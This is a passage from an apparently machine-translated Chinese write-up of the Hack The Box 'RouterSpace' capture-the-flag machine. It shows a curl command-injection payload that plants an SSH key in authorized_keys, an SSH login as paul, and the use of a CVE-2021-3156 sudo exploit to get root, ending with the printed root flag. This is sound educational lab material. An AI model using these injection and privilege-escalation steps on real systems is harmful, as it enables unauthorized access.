aw mx bi"><span id="ef5e" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# curl -s -H 'user-agent: RouterSpaceAgent' -H 'Content-Type: application/json' --data-binary $'{\"ip\":\"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4jyNVMJ963UsvyDfhRCXbXMcVS4Psrhcm1Yf9VlDlip5DiuiMuZc/ODFLLGrEpq8xyVTVX1/nXD7yjXRl60bfnwvD3qUHPjlNCj25eSVe0Nf2uWnfaW3DNDJ4ZX0NRbwfsVxGCM15DnKC6Qx85S5I+S15M3pzh4+wf5o59ebRWrHVgWAUTkJ2ktM+zb/5m18Sjpafe/JC6TKOEGZcwjeE0l3+jsVBxukjj6mhmgEaO2hFE83HwqyhLmhPYvcVEP3wF8ln5yNTBUhHaReY8UV5hPESHsw1jTPfgFvLt2/J0bX35bpt9qbKpVxKv58t7+phG/OSy7i7MLZSLjToFvxCiBBCnY0kUo1Qn1E10TdeAhYx6Q/wf/re5SbiPWg2UWQYeUayGA8SgoYaal+SaX9Yn9ukOiSVkjEMlwI1ULrrcIPNbIRxfj8iL2xYqU6BLspFqrO5PKabeIWBmJlWqKs1esCJQQ6RX8im5kEr/LW61fIvSjkUvDcb0IaC0Z8Y/ms= root@kali' &gt; /home/paul/.ssh/authorized_keys\"}' http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess</span></pre><p id="77dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali上更改我们私钥的权限:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="e585" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# chmod 600 id_rsa</span></pre><p id="24db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以以Paul的身份登录:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="16e8" class="my kn iq mu b gy mz na l nb nc">┌──(root㉿kali)-[~/htb/routerspace]<br/>└─# ssh -i id_rsa paul@routerspace.htb<br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)<br/><br/>  System information as of Tue 19 Apr 2022 09:00:51 PM UTC<br/><br/>  System load:  0.0               Processes:             206<br/>  Usage of /:   71.0% of 3.49GB   Users logged in:       1<br/>  Memory usage: 31%               IPv4 address for eth0: 10.10.11.148<br/>  Swap usage:   0%<br/><br/>Last login: Tue Apr 19 20:59:32 2022 from 10.10.14.124<br/>paul@routerspace:~$</span></pre><h1 id="d268" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">CVE-2021–3156</h1><p id="ee2c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">在这种情况下，升级到root用户非常简单。如果你复制<a class="ae kl" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank"> LinPEAS </a>，它的输出会告诉你这个盒子有一个易受CVE攻击的sudo版本-2021–3156。也被称为巴隆·萨姆迪特，如果你感兴趣，这里有一些信息<a class="ae kl" href="https://info.dovermicrosystems.com/blog/what-is-baron-samedit" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="1749" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以检查安装的版本:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="3ba9" class="my kn iq mu b gy mz na l nb nc">paul@routerspace:~$ sudo -V<br/>Sudo version 1.8.31<br/>Sudoers policy plugin version 1.8.31<br/>Sudoers file grammar version 46<br/>Sudoers I/O plugin version 1.8.31</span></pre><p id="6bce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个版本确实很脆弱。我在GitHub上看了一下，发现了这个漏洞。我只是把它复制/粘贴到盒子上的一个文件中:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="42a1" class="my kn iq mu b gy mz na l nb nc">paul@routerspace:~$ cat exploit.py <br/>#!/usr/bin/python3<br/>Exploit for CVE-2021-3156 with overwrite struct service_user by sleepya<br/><br/>This exploit requires:<br/>- glibc with tcache<br/>- nscd service is not running<br/><br/>Tested on:<br/>- Ubuntu 18.04</span></pre><h1 id="a251" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">根标志</h1><p id="9247" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">然后运行它以获得根和标志:</p><pre class="ll lm ln lo gt mt mu mv mw aw mx bi"><span id="0123" class="my kn iq mu b gy mz na l nb nc">paul@routerspace:~$ python3 exploit.py<br/># id<br/>uid=0(root) gid=0(root) groups=0(root),1001(paul)<br/><br/># cat /root/root.txt<br/>c97714e03098f4ef64378114f235078a</span></pre><p id="69cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出于某种原因，我花了很长时间才让一个盒子工作，但之后这个盒子就变得非常简单了。</p><p id="ef0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">希望你学到了一些东西，下次见。</p></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><p id="ab67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="7005" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae kl" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae kl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="8f0a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nx">原载于2022年7月9日</em><a class="ae kl" href="https://pencer.io/ctf/ctf-htb-routerspace/" rel="noopener ugc nofollow" target="_blank"><em class="nx">https://pencer . io</em></a><em class="nx">。</em></p></div></div>    
</body>
</html>